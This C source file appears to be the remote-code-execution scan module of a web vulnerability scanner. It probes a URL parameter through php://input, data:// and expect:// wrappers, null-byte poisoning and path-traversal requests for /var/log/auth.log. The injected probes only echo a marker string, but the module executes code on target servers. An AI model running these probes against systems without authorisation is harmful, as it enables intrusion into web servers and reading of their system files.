#include "scan/rce-scan.h"
#include "techniques/rce.h"
#include "request/request.h"
#include "regex/pcre.h"
#include "io/utils.h"
#include "output.h"

#include <string.h>
#include <sys/mman.h>

void php_input_scan(url_t *url, int pos)
{
	char *rce, *target;

	xinfo("testing php://input ...\n");
	target = buildurl(url, string_replace, "php://input", pos);

	xinfo("requesting: %s\n", target);

	rce = php_input_rce(target, "<?php echo 'vulnerable'; ?>");
	if (rce && !strcmp(rce, "vulnerable")) {
		xgood("target vulnerable: %s\n", target);
		goto end;
	}

	free(target);
	free(rce);

	xinfo("testing php://input with null-byte poison...\n");
	target = buildurl(url, string_replace, "php://input%00", pos);

	xinfo("requesting: %s\n", target);

	rce = php_input_rce(target, "<?php echo 'vulnerable'; ?>");
	if (rce && !strcmp(rce, "vulnerable")) {
		xgood("target vulnerable: %s\n", target);
		goto end;
	}

	xwarn("probably not vulnerable\n");

end:
	free(target);
	free(rce);

	xinfo("php://input test finish\n");
}

void data_wrap_scan(url_t *url, int pos)
{
	xinfo("testing data wrap ...\n");

	char *rce = datawrap_rce(url, "<?php echo 'vulnerable'; ?>", pos);
	if (rce && !strcmp(rce, "vulnerable")) {
		xgood("target vulnerable to data://text/plain;base64,RCE\n");
		xgood("parameter: %s\n", url->parameters[pos].key);
	} else {
		xwarn("probably not vulnerable\n");
	}

	free(rce);
	xinfo("data wrap test finish\n");
}

void auth_log_scan(url_t *url, int pos)
{
	static const char *auth[] = {
		"/var/log/auth.log",
		"../../../../../../../../../../../var/log/auth.log",
		"/var/log/auth.log%00",
		"../../../../../../../../../../../var/log/auth.log%00",
		NULL
	};

	char filename[20];
	int skip = 0;
	FILE *fh;

	for (int i = 0; !skip && auth[i]; i++) {
		request_t req;

		if ((fh = randomfile(filename, 10)) == NULL) {
			die("error while generate tmp file\n");
		}

		char *target = buildurl(url, string_replace, auth[i], pos);
		request_init_fh(&req);

		curl_easy_setopt(req.ch, CURLOPT_URL, target);
		curl_easy_setopt(req.ch, CURLOPT_WRITEDATA, fh);

		xinfo("requesting: %s\n", target);

		if (request_exec(&req)) {
			xerror("request error\n");
		}

		fclose(fh);
		int fd = openro(filename);
		int size = getfdsize(fd);

		if (size) {
			char *map = mmap(0, size, PROT_READ, MAP_PRIVATE, fd, 0);

			if (regex_match("\\d+:\\d+:\\d+.*sshd\\[\\d+\\]:.+$", map, size, PCRE_MULTILINE)) {
				xgood("auth_log file found at: %s\n", target);
				skip = 1;
				//xgood("you can try check for RCE");
			}

			munmap(map, size);
		}

		close(fd);
		free(target);
		unlink(filename);
		request_free(&req);
	}

	if (!skip) xwarn("probably not vulnerable\n");
	xinfo("/var/log/auth.log test finish\n");
}

void expect_scan(url_t *url, int pos)
{
	xinfo("testing expect://cmd rce ...\n");

	char *rce = expect_url(url, "echo -n vuln", pos);
	if (rce && !strcmp(rce, "vuln")) {
		xgood("target vulnerable to expect://cmd\n");
		xgood("parameter: %s\n", url->parameters[pos].key);
	}

	free(rce);
	xinfo("expect://cmd test finish\n");
}

void kadimus_rce_scan(url_t *url, int pos)
{
	php_input_scan(url, pos);
	data_wrap_scan(url, pos);
	auth_log_scan(url, pos);
	expect_scan(url, pos);
}
